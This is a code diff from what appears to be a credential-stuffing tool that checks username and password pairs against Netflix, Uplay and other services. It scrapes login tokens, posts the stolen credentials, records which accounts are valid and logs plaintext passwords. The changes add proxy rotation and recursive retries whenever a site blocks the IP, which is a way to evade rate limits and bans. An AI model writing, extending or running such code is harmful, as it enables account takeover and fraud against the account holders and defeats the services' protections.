@@ -131,37 +131,42 @@ def pornhub(usr : str, pwd : str, mr : ManageRequest):
     mr.req.cookies.clear()
 
 
-def netflix(usr : str, pwd : str, mr : ManageRequest):
+def netflix(usr: str, pwd: str, mr: ManageRequests):
     site_url = "https://www.netflix.com/Login"
 
     # Get login page with authURL
-    res = mr.req.get(site_url, headers={'User-Agent': 'Mozilla/5.0'})
+    res = mr.get_with_checks(site_url, headers={'User-Agent': 'Mozilla/5.0'})
     # Filter out authURL value
-    soup = BeautifulSoup(res.text, features="html.parser")
-    authURL = soup.find('input', attrs={'name': 'authURL'})['value']
+    if res:
+        soup = BeautifulSoup(res.text, features="html.parser")
+        authURL = soup.find('input', attrs={'name': 'authURL'})['value']
 
-    # Post request to login
-    res = mr.post_with_checks(site_url,
-                              data={'email': usr,
-                                    'password': pwd,
-                                    'rememberMe': True,
-                                    'flow': 'websiteSignUp',
-                                    'mode': 'login',
-                                    'action': 'loginAction',
-                                    'withFields': 'email,password,rememberMe,nextPage',
-                                    'authURL': authURL,
-                                    'nextPage': 'https://www.netflix.com/viewingactivity'
-                                    })
+        # Post request to login
+        res = mr.post_with_checks(site_url,
+                                  data={'email': usr,
+                                        'password': pwd,
+                                        'rememberMe': True,
+                                        'flow': 'websiteSignUp',
+                                        'mode': 'login',
+                                        'action': 'loginAction',
+                                        'withFields': 'email,password,rememberMe,nextPage',
+                                        'authURL': authURL,
+                                        'nextPage': 'https://www.netflix.com/viewingactivity'
+                                        })
 
-    if 'Login' not in res.url:
-        mr.db.update_result(usr, pwd, "netflix", "True")
-        log.info("Account valid {}".format(usr))
+        if 'Login' not in res.url:
+            mr.db.update_result(usr, pwd, "netflix", "True")
+            log.info("Account valid {}".format(usr))
+        else:
+            mr.db.update_result(usr, pwd, "netflix", "False")
+            log.info("Account error {} {}".format(usr, pwd))
+        log.info("-------------------------------")
     else:
-        mr.db.update_result(usr, pwd, "netflix", "False")
-        log.info("Account error {} {}".format(usr, pwd))
+        log.error("Netflix banned the ip, forcing change")
+        mr.set_random_proxy()
+        netflix(usr, pwd, mr)
     log.info("-------------------------------")
     mr.req.cookies.clear()
-
 
 def uplay(usr : str, pwd : str, mr : ManageRequest):
     usr: str
@@ -172,7 +177,6 @@ def uplay(usr : str, pwd : str, mr : ManageRequest):
     mr.req.headers = {"Content-Type": "application/json", "Ubi-AppId": "e06033f4-28a4-43fb-8313-6c2d882bc4a6",
                       "Authorization": "Basic " + encoding}
     res = mr.post_with_checks(site_post)
-
     if res:
         if res.status_code == 200:
             mr.db.update_result(usr, pwd, "uplay", "True")
@@ -181,13 +185,12 @@ def uplay(usr : str, pwd : str, mr : ManageRequest):
             mr.db.update_result(usr, pwd, "uplay", "False")
             log.info("Account error {} {}".format(usr, pwd))
     else:
-        mr.db.update_result(usr, pwd, "uplay", "False")
-        log.info("Account error {} {}".format(usr, pwd))
-
+        log.error("Uplay banned the ip, forcing change")
+        mr.set_random_proxy()
+        uplay(usr, pwd, mr)
     log.info("-------------------------------")
     mr.req.cookies.clear()
-
-
+    
 def nordvpn(usr : str, pwd : str, mr : ManageRequest):
     """
     Custom functions must have 3 params: username and password to check, and a ManageRequests object
